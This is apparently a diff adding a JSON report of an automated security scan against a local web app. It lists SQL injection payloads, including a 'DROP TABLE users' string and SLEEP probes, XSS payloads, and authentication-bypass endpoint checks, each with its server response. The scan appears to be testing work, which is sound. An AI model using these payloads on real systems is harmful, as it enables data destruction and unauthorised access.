@@ -1,0 +1,151 @@
+{
+  "timestamp": "2025-10-27T16:10:45.459860",
+  "target": "http://localhost:3000",
+  "summary": {
+    "total_tests": 20,
+    "vulnerabilities_found": 6
+  },
+  "detailed_results": {
+    "sql_injection": [
+      {
+        "payload": "' OR '1'='1",
+        "status_code": 401,
+        "response_time": 0.069678,
+        "response_length": 26,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "' OR 1=1 --",
+        "status_code": 200,
+        "response_time": 0.067624,
+        "response_length": 799,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "' UNION SELECT NULL, NULL, NULL --",
+        "status_code": 500,
+        "response_time": 0.031079,
+        "response_length": 1449,
+        "detected_vulnerability": true
+      },
+      {
+        "payload": "'; DROP TABLE users; --",
+        "status_code": 401,
+        "response_time": 0.013988,
+        "response_length": 26,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "' OR SLEEP(5) --",
+        "status_code": 500,
+        "response_time": 0.03932,
+        "response_length": 1449,
+        "detected_vulnerability": true
+      },
+      {
+        "payload": "admin'--",
+        "status_code": 401,
+        "response_time": 0.027425,
+        "response_length": 26,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "' OR 'x'='x",
+        "status_code": 401,
+        "response_time": 0.013783,
+        "response_length": 26,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "1' AND SLEEP(5)#",
+        "status_code": 500,
+        "response_time": 0.026056,
+        "response_length": 1449,
+        "detected_vulnerability": true
+      }
+    ],
+    "xss": [
+      {
+        "payload": "<script>alert(\"XSS\")</script>",
+        "status_code": 200,
+        "response_length": 30,
+        "reflected": false,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "\"><script>alert(\"XSS\")</script>",
+        "status_code": 200,
+        "response_length": 30,
+        "reflected": false,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "'><script>alert('XSS')</script>",
+        "status_code": 500,
+        "response_length": 980,
+        "reflected": false,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "<img src=x onerror=alert(\"XSS\")>",
+        "status_code": 200,
+        "response_length": 30,
+        "reflected": false,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "<svg onload=alert(\"XSS\")>",
+        "status_code": 200,
+        "response_length": 30,
+        "reflected": false,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "javascript:alert(\"XSS\")",
+        "status_code": 200,
+        "response_length": 30,
+        "reflected": false,
+        "detected_vulnerability": false
+      },
+      {
+        "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+        "status_code": 500,
+        "response_length": 978,
+        "reflected": false,
+        "detected_vulnerability": false
+      }
+    ],
+    "authentication_bypass": [
+      {
+        "endpoint": "/api/Users",
+        "status_code": 401,
+        "accessible": false,
+        "authentication_bypassed": false
+      },
+      {
+        "endpoint": "/rest/user/whoami",
+        "status_code": 200,
+        "accessible": true,
+        "authentication_bypassed": true
+      },
+      {
+        "endpoint": "/rest/user/change-password",
+        "status_code": 401,
+        "accessible": false,
+        "authentication_bypassed": false
+      },
+      {
+        "endpoint": "/api/Challenges",
+        "status_code": 200,
+        "accessible": true,
+        "authentication_bypassed": true
+      },
+      {
+        "endpoint": "/rest/admin/application-configuration",
+        "status_code": 200,
+        "accessible": true,
+        "authentication_bypassed": true
+      }
+    ]
+  }
+}
